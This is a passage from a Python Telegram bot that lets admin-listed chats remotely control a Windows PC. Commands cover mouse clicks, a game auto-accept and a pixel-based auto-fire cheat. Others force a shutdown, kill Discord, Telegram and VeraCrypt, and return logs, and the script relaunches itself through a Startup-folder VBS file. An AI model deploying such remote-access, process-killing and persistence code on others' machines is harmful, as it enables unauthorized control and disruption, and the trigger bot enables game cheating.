            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['RightClick', 'rightclick', 'rc'])
def rightclick(message):
    if message.chat.id in adm:
        try:
            pyautogui.rightClick()
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['LeftDoubleClick', 'leftdoubleclick', 'ldc'])
def leftdoubleclick(message):
    if message.chat.id in adm:
        try:
            pyautogui.doubleClick(button="left")
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['MiddleClick', 'middleclick', 'mc'])
def middleclick(message):
    if message.chat.id in adm:
        try:
            pyautogui.middleClick()
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['RightHold', 'righthold', 'rh'])
def righthold(message):
    if message.chat.id in adm:
        try:
            pyautogui.mouseDown(button="right")
            time.sleep(2)
            pyautogui.mouseUp(button="right")
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['AutoAcceptOn', 'autoaccepton', 'acon'])
def autoaccepton(message):
    global stopfunc
    if message.chat.id in adm:
        try:
            stopfunc = 0
            def func(id):
                global stopfunc
                while stopfunc == 0:
                    for i in os.listdir("c:/ProgramData/Files/Photos/ScreenAccept"):
                        try:
                            leftClick(center(locateOnScreen("c:/ProgramData/Files/Photos/ScreenAccept/"+i, confidence=0.9)))
                            bot.send_message(id, "Успешно принята игра")
                            stopfunc = 1
                            break
                        except:
                            time.sleep(0.05)
            threading.Thread(target=func, args=(message.chat.id,)).start()
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['AutoAcceptOff', 'autoacceptoff', 'acoff'])
def autoaccepton(message):
    global stopfunc
    if message.chat.id in adm:
        try:
            stopfunc = 1
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['MoveMouse', 'movemouse', 'mm'])
def movemouse(message):
    if message.chat.id in adm:
        try:
            pyautogui.moveTo(x=int(message.text.split()[1]), y=int(message.text.split()[2]))
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            try:
                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                log.write(
                    f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
                log.close()
                try:
                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
                except:
                    pass
            except Exception as e:
                print(e)


@bot.message_handler(commands=['Trigger', 'trigger', 'tr'])
def trigger(message):
    global stoptr
    if message.chat.id in adm:
        try:
            stoptr = 0
            def tr(id):
                global stoptr
                pixel = pyautogui.pixel(pyautogui.position().x + 2, pyautogui.position().y + 2)
                bot.send_message(id, pixel)
                while stoptr == 0:
                    if pixel != pyautogui.pixel(pyautogui.position().x + 2, pyautogui.position().y + 2):
                        bot.send_message(id, pyautogui.pixel(pyautogui.position().x + 2, pyautogui.position().y + 2))
                        leftClick()
                        bot.send_message(id, "Успешный выстрел")
                        stoptr = 1
                        break
                    else:
                        time.sleep(0.01)
            threading.Thread(target=tr, args=(message.chat.id,)).start()
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            try:
                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                log.write(
                    f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
                log.close()
                try:
                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
                except:
                    pass
            except:
                pass


@bot.message_handler(commands=['TriggerOff', 'triggeroff', 'tf'])
def triggeroff(message):
    global stoptr
    if message.chat.id in adm:
        try:
            stoptr = 1
            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
            log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['poweroff', 'PowerOff', 'po'])
def poweroff(message):
    if message.chat.id in adm:
        try:
            message.answer(chat_id=message.chat.id, message_id=message.message_id,
                                  text='*Компьютер выключен!*', parse_mode="Markdown")
            os.system('shutdown -s /t 0 /f')
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['powerofftime', 'PowerOffTime', 'pot'])
def powerofftime(message):
    if message.chat.id in adm:
        try:
            message.answer(chat_id=message.chat.id, message_id=message.message_id,
                                  text='*Компьютер будет выключен через 5 минут!*', parse_mode="Markdown")
            os.system('shutdown -s /t 300 /f')
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['powerofftime', 'PowerOffTime', 'pot'])
def powerofftime(message):
    if message.chat.id in adm:
        try:
            message.answer(chat_id=message.chat.id, message_id=message.message_id,
                                  text='*Компьютер будет выключен через 5 минут!*', parse_mode="Markdown")
            os.system('shutdown -s /t 300 /f')
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['getlastlogs', 'gll'])
def getlastlogs(message):
    if message.chat.id in adm:
        try:
            files = os.listdir("c:/ProgramData/Files/Documents/logs/")
            paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
            bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
        except Exception as e:
            log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(
                pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt", "a")
            log.write(
                f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
            log.close()
            try:
                files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
            except:
                pass


@bot.message_handler(commands=['safemode', 'sm'])
def safemode(message):
    if message.chat.id in adm:
        try:
            os.system('taskkill /f /im discord.exe')
        except:
            pass
        try:
            os.system('taskkill /f /im telegram.exe')
        except:
            pass
        try:
            os.system('taskkill /f /im veracrypt.exe')
        except:
            pass


try:
    bot.polling(none_stop=True)
except:
    stoper = 0
    try:
        os.startfile('C:\\ProgramData\\Files\\start.vbs')
    except:
        try:
            os.startfile(
                'C:\\Users\\' + os.getlogin() + '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.vbs')
        except Exception as e:
            stoper = 1
            try:
                log = open("c:/ProgramData/Files/Documents/logs/ERROR " + datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H.%M') + ".txt","a")
                log.write(f"\n[ERROR] [{datetime.now().astimezone(pytz.timezone('Asia/Ashgabat')).strftime('%Y-%m-%d %H:%M:%S')}] ({message.chat.id}) {message.chat.username} Написал - {message.text}\n\nОшибка:\n{e}")
                log.close()
                try:
                    files = os.listdir("c:/ProgramData/Files/Documents/logs/")
                    paths = [os.path.join("c:/ProgramData/Files/Documents/logs/", basename) for basename in files]
                    bot.send_document(message.chat.id, open(max(paths, key=os.path.getctime), "rb"))
                except:
                    pass
            except:
                pass
            time.sleep(10)
    if stoper == 0:
        os.system('taskkill /f /im py.exe')
        exit()
